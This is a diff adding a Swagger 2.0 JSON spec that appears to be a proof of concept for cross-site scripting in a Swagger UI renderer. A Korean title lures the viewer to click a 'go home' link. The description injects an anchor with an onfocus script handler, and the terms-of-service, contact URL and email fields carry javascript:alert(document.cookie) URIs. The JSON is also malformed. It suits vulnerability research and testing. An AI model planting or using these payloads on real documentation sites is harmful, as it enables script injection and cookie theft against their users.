@@ -1,0 +1,13 @@
+{
+  "swagger": "2.0",
+  "info": 
+  {"title": "아래 [홈으로 이동] 링크를 클릭하세요",
+  "description": "</p><a id=x tabindex=1 onfocus=alert`1`;><h2>홈으로 이동</h2></a>",
+  "termsOfService": "javascript:alert(document.cookie)"
+  "contact": 
+  {"name": "AHNLAB",
+    "url": "javascript:alert(document.cookie)",
+    "email": "javascript:alert(document.cookie)"},
+  "version": "1.0.1"
+}
+}
